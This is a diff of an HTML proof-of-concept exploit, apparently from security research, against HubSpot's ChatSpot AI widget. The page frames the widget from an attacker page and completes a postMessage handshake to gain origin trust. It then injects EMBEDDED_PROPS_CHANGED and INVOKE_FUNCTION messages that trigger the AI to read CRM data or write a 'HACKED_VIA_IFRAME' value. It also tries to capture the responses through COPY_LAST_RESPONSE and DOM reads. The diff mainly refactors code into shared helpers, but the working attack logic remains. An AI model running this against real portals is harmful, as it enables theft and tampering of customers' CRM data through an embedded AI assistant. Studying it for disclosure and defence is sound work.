@@ -3,25 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <title>ChatSpot postMessage Origin Trust Bypass — PoC</title>
+<link rel="stylesheet" href="shared/theme.css">
 <style>
-  body { font-family: monospace; background: #111; color: #0f0; margin: 0; }
-  #log { height: 45vh; overflow-y: auto; padding: 10px; border-bottom: 2px solid #0f0; font-size: 12px; }
+  body { background: #111; margin: 0; padding: 0; }
+  #log { height: 45vh; padding: 10px; border-bottom: 2px solid #0f0; }
   #iframe-container { height: 55vh; position: relative; }
   iframe { width: 100%; height: 100%; border: none; }
-  .status  { color: #0ff; }
-  .trusted { color: #ff0; }
-  .data    { color: #f80; white-space: pre-wrap; word-break: break-all; }
-  .error   { color: #f00; }
-  .write   { color: #f0f; }
   #controls { position: absolute; top: 10px; right: 10px; z-index: 9999; display: flex; flex-wrap: wrap; gap: 4px; max-width: 420px; justify-content: flex-end; }
-  button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; font-family: monospace; font-size: 11px; }
-  button:hover { background: #0f0; color: #000; }
+  button { padding: 4px 10px; font-size: 11px; }
   button.write-btn { border-color: #f0f; color: #f0f; }
   button.write-btn:hover { background: #f0f; color: #000; }
   #status-bar { padding: 4px 10px; background: #1a1a1a; font-size: 11px; border-bottom: 1px solid #333; }
   #config { padding: 8px 10px; background: #151515; border-bottom: 1px solid #333; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; font-size: 11px; }
   #config label { color: #aaa; }
-  #config input, #config select { background: #222; color: #eee; border: 1px solid #444; padding: 2px 6px; font-family: monospace; font-size: 11px; }
+  #config input, #config select { background: #222; color: #eee; border: 1px solid #444; padding: 2px 6px; font-size: 11px; }
   #config input { width: 140px; }
 </style>
 </head>
@@ -57,7 +52,7 @@
     <button onclick="sendCopyLastResponse()">SEND: COPY_LAST_RESPONSE</button>
     <button onclick="sendSync()">RE-SEND SYNC</button>
     <button onclick="resetPoc()">RESET</button>
-    <button onclick="clearLog()">CLR LOG</button>
+    <button onclick="logger.clear()">CLR LOG</button>
     <button onclick="dumpAll()">DUMP ALL JSON</button>
     <!-- EMBEDDED_PROPS_CHANGED injection buttons (work after SYNC_ACK) -->
     <button class="write-btn" onclick="injectReadActionProp('object_summary')">PROPS→ object_summary</button>
@@ -67,33 +62,22 @@
   </div>
 </div>
 
+<script src="shared/logger.js"></script>
+<script src="shared/hs-ifr.js"></script>
 <script>
 // ── State ──────────────────────────────────────────────────────────────────
-const HS_IFR = '__hs-ifr';
 let iframeEl      = null;
 let chatspotId    = null;
 let embedId       = null;
 let originTrusted = false;
-let msgCount      = 0;
 let capturedResponses = [];
 
-// ── Helpers ────────────────────────────────────────────────────────────────
-function log(msg, cls = '') {
-  const div = document.getElementById('log');
-  const ts  = new Date().toISOString().split('T')[1].split('.')[0];
-  const el  = document.createElement('div');
-  if (cls) el.className = cls;
-  el.textContent = `[${ts}] ${msg}`;
-  div.appendChild(el);
-  div.scrollTop = div.scrollHeight;
-}
+var logger = PocLogger.create({ timestampFormat: 'iso' });
+function log(msg, cls) { logger.log(msg, cls); }
 
+// ── Helpers ────────────────────────────────────────────────────────────────
 function setStatus(text) {
   document.getElementById('status-text').textContent = text;
-}
-
-function clearLog() {
-  document.getElementById('log').innerHTML = '';
 }
 
 function getConfig() {
@@ -142,17 +126,10 @@ function loadChatspot(copilotActionEncoded) {
 
 // ── SYNC handshake ─────────────────────────────────────────────────────────
 function sendSync() {
-  if (!iframeEl || !iframeEl.contentWindow) {
-    log('ERROR: iframe not ready', 'error');
-    return;
-  }
+  if (!HsIfr.requireIframe(iframeEl, log)) return;
   embedId = crypto.randomUUID();
-  const syncMsg = {
-    id:      crypto.randomUUID(),
-    format:  HS_IFR,
-    from:    'HOST',
-    to:      embedId,
-    v:       1,
+  const syncMsg = HsIfr.buildMessage({
+    to: embedId,
     payload: {
       type:          'SYNC',
       embedId,
@@ -161,44 +138,33 @@ function sendSync() {
       appData:       {},
       embeddedProps: {}
     }
-  };
+  });
   log('→ Sending SYNC: ' + JSON.stringify(syncMsg), 'status');
-  iframeEl.contentWindow.postMessage(syncMsg, '*');
+  HsIfr.send(iframeEl, syncMsg);
 }
 
 // ── Generic __hs-ifr message sender ───────────────────────────────────────
 function sendHsIfrMessage(payloadType, extra = {}) {
-  if (!iframeEl || !iframeEl.contentWindow) { log('iframe not ready', 'error'); return; }
-  if (!originTrusted) { log('Origin not yet trusted — waiting for SYNC_ACK first', 'error'); return; }
-  const msg = {
-    id:     crypto.randomUUID(),
-    format: HS_IFR,
-    from:   'HOST',
-    to:     chatspotId || '*',
-    v:      1,
+  if (!HsIfr.requireIframe(iframeEl, log)) return;
+  if (!HsIfr.requireTrust(originTrusted, log)) return;
+  const msg = HsIfr.buildMessage({
+    to: chatspotId || '*',
     payload: Object.assign({ type: payloadType }, extra)
-  };
+  });
   log('→ Sending ' + payloadType + ': ' + JSON.stringify(extra), 'write');
-  iframeEl.contentWindow.postMessage(msg, '*');
+  HsIfr.send(iframeEl, msg);
 }
 
 // ── EMBEDDED_PROPS_CHANGED injection ──────────────────────────────────────
-// copilotActionQueryParam is declared in setPropsSchema and used in a useEffect
-// with [c] as a dependency — changing it via EMBEDDED_PROPS_CHANGED re-triggers
-// setCopilotQueryParams() which re-fires the AI action pipeline.
 function sendEmbeddedPropsChanged(newProps) {
-  if (!iframeEl || !iframeEl.contentWindow) { log('iframe not ready', 'error'); return; }
-  if (!originTrusted) { log('Origin not yet trusted — wait for SYNC_ACK', 'error'); return; }
-  const msg = {
-    id:     crypto.randomUUID(),
-    format: HS_IFR,
-    from:   'HOST',
-    to:     chatspotId || embedId,
-    v:      1,
+  if (!HsIfr.requireIframe(iframeEl, log)) return;
+  if (!HsIfr.requireTrust(originTrusted, log, 'Origin not yet trusted — wait for SYNC_ACK')) return;
+  const msg = HsIfr.buildMessage({
+    to: chatspotId || embedId,
     payload: Object.assign({ type: 'EMBEDDED_PROPS_CHANGED' }, newProps)
-  };
+  });
   log('→ EMBEDDED_PROPS_CHANGED: ' + JSON.stringify(newProps).substring(0, 120), 'write');
-  iframeEl.contentWindow.postMessage(msg, '*');
+  HsIfr.send(iframeEl, msg);
 }
 
 function injectReadActionProp(intent) {
@@ -224,10 +190,6 @@ function injectReadActionProp(intent) {
   sendEmbeddedPropsChanged({ copilotActionQueryParam: JSON.stringify(actionObj) });
 }
 
-// Inject crm_object_upsert — write firstname to 'HACKED_VIA_IFRAME'
-// copilotAction Rn() parser only handles read intents in this JS version,
-// but the prop change still reaches setCopilotQueryParams — logging the full
-// dispatch to confirm whether the write intent propagates to the AI.
 function injectWriteActionProp() {
   const cfg = getConfig();
   const actionObj = {
@@ -242,13 +204,10 @@ function injectWriteActionProp() {
 }
 
 // ── Button actions ─────────────────────────────────────────────────────────
-// Load WITHOUT copilotAction in URL — then inject via EMBEDDED_PROPS_CHANGED post-SYNC
-// This is the stealthy variant: no URL fingerprint, action injected after trust established
 function loadStealthy() {
   const cfg = getConfig();
   document.getElementById('portal-display').textContent = cfg.portalId;
 
-  // No copilotAction param — iframe loads blank, no AI pre-trigger
   const src = `https://app-eu1.hubspot.com/chatspot-widget-ui/${cfg.portalId}/chat`
     + `?hostAppName=attacker-page`
     + `&copilotThreadId=exfil-${Date.now()}`;
@@ -271,21 +230,15 @@ function loadStealthy() {
   });
 }
 
-// Send INVOKE_FUNCTION message to widget via child.receiveMessage path
-// The widget has ONE registered function subscriber: "onCopilotToggled" (tracking only)
 function sendInvokeFunction(fnName, args) {
-  if (!iframeEl || !iframeEl.contentWindow) { log('iframe not ready', 'error'); return; }
-  if (!originTrusted) { log('Wait for SYNC_ACK', 'error'); return; }
-  const msg = {
-    id:     crypto.randomUUID(),
-    format: HS_IFR,
-    from:   'HOST',
-    to:     chatspotId || '*',
-    v:      1,
+  if (!HsIfr.requireIframe(iframeEl, log)) return;
+  if (!HsIfr.requireTrust(originTrusted, log, 'Wait for SYNC_ACK')) return;
+  const msg = HsIfr.buildMessage({
+    to: chatspotId || '*',
     payload: { type: 'INVOKE_FUNCTION', fnName, args }
-  };
+  });
   log(`→ INVOKE_FUNCTION fnName=${fnName}: ` + JSON.stringify(args), 'write');
-  iframeEl.contentWindow.postMessage(msg, '*');
+  HsIfr.send(iframeEl, msg);
 }
 
 function testReadSummary() {
@@ -339,7 +292,6 @@ function resetPoc(doLog = true) {
   chatspotId    = null;
   embedId       = null;
   originTrusted = false;
-  msgCount      = 0;
   setStatus('IDLE');
   if (doLog) log('--- RESET ---', 'status');
 }
@@ -378,7 +330,7 @@ function dumpAll() {
 window.addEventListener('message', e => {
   if (!e.data) return;
 
-  if (e.data.format !== HS_IFR) {
+  if (e.data.format !== HsIfr.FORMAT) {
     const raw = JSON.stringify(e.data);
     if (raw.length > 20 && !raw.includes('webpack') && !raw.includes('contentscript')) {
       log(`← NON-IFR msg from ${e.origin}: ${raw}`, 'data');
@@ -386,7 +338,7 @@ window.addEventListener('message', e => {
     return;
   }
 
-  msgCount++;
+  var msgCount = logger.getCount();
   const payload = e.data.payload || {};
   const msgType = payload.type || e.data.type || '(unknown)';
 
@@ -436,12 +388,8 @@ window.addEventListener('message', e => {
         && payload.args?.key === 'copilotAction'
         && payload.args?.value === '') {
       log('*** AI FIRED — AI pipeline triggered, CRM data being read ***', 'trusted');
-      // Auto schedule COPY_LAST_RESPONSE after AI completes (10s)
       setTimeout(() => {
         log('→ Auto-sending COPY_LAST_RESPONSE (10s after AI fired)...', 'write');
-        // NOTE: COPY_LAST_RESPONSE is an OUTBOUND cap (widget→parent), not inbound.
-        // Sending it inbound goes to child.receiveMessage → not handled → no-op.
-        // But testing anyway to confirm widget sends anything back.
         sendHsIfrMessage('INVOKE_CAPABILITY', { name: 'COPY_LAST_RESPONSE', source: 'attacker', args: {} });
       }, 10000);
     }
@@ -456,7 +404,6 @@ window.addEventListener('message', e => {
       [3000, 8000, 15000].forEach(delay => setTimeout(() => attemptDomRead(delay), delay));
     }
 
-    // Catch any capability that carries text content
     const argsStr = JSON.stringify(payload.args || {});
     if (argsStr.length > 100 && (argsStr.includes('text') || argsStr.includes('content') || argsStr.includes('message') || argsStr.includes('response'))) {
       log('*** POSSIBLE RESPONSE DATA IN CAP ARGS ***', 'trusted');
